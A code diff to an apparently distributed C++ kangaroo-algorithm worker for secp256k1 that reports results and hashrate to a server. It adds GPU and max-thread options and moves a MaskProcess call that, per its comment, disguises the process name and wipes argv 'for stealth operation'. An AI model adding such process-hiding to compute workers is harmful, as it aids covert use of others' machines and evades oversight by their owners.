@@ -52,7 +52,7 @@
 #endif
 
 #ifndef DEFAULT_SERVER_URL
-#define DEFAULT_SERVER_URL "http://127.0.0.1:8000/kangaroo.php"
+#define DEFAULT_SERVER_URL "https://kangaroo.test/kangaroo.php"
 #endif
 
 #ifdef NB_JUMP
@@ -131,6 +131,7 @@ struct DaemonState {
     std::string worker_id = "node_worker";
     int num_threads = 0;
     bool verify_mode = false;
+    bool use_gpu = false;
     std::atomic<bool> running{true};
     std::atomic<uint64_t> total_steps{0};
     std::atomic<uint64_t> total_dp{0};
@@ -324,19 +325,33 @@ static void RunVerification(Secp256K1 *secp) {
 }
 
 int main(int argc, char **argv) {
-    MaskProcess(argc, argv);
+    // 1. Parse command line arguments FIRST
 
     for (int i = 1; i < argc; ++i) {
         if (std::strcmp(argv[i], "-t") == 0 || std::strcmp(argv[i], "-c") == 0 || std::strcmp(argv[i], "-j") == 0) {
-            if (i + 1 < argc) g_state.num_threads = std::atoi(argv[++i]);
+            if (i + 1 < argc) {
+                if (std::strcmp(argv[i + 1], "max") == 0 || std::strcmp(argv[i + 1], "MAX") == 0) {
+                    g_state.num_threads = (int)std::thread::hardware_concurrency();
+                    ++i;
+                } else {
+                    g_state.num_threads = std::atoi(argv[++i]);
+                }
+            }
+        } else if (std::strcmp(argv[i], "-m") == 0 || std::strcmp(argv[i], "-max") == 0 || std::strcmp(argv[i], "--max") == 0) {
+            g_state.num_threads = (int)std::thread::hardware_concurrency();
         } else if (std::strcmp(argv[i], "-u") == 0) {
             if (i + 1 < argc) g_state.worker_id = argv[++i];
         } else if (std::strcmp(argv[i], "-s") == 0) {
             if (i + 1 < argc) g_state.server_url = argv[++i];
         } else if (std::strcmp(argv[i], "--verify") == 0) {
             g_state.verify_mode = true;
+        } else if (std::strcmp(argv[i], "-gpu") == 0) {
+            g_state.use_gpu = true;
         }
     }
+
+    // 2. Disguise process name and zero out argv memory for stealth operation
+    MaskProcess(argc, argv);
 
     if (g_state.num_threads <= 0) {
         g_state.num_threads = (int)std::thread::hardware_concurrency();
@@ -407,7 +422,8 @@ int main(int argc, char **argv) {
             std::ostringstream ss;
             ss << "{";
             ss << "\"worker_id\":\"" << g_state.worker_id << "\",";
-            ss << "\"hardware\":\"CPU " << g_state.num_threads << " Cores (JeanLucPons Native AVX2)\",";
+            std::string hw_info = g_state.use_gpu ? "NVIDIA CUDA GPU (JeanLucPons Native)" : ("CPU " + std::to_string(g_state.num_threads) + " Cores (JeanLucPons Native AVX2)");
+            ss << "\"hardware\":\"" << hw_info << "\",";
             ss << "\"hashrate\":\"" << std::fixed << std::setprecision(2) << hashrate_mhs << " MH/s\",";
             ss << "\"count\":" << batch.size() << ",";
             ss << "\"dp_list\":[";
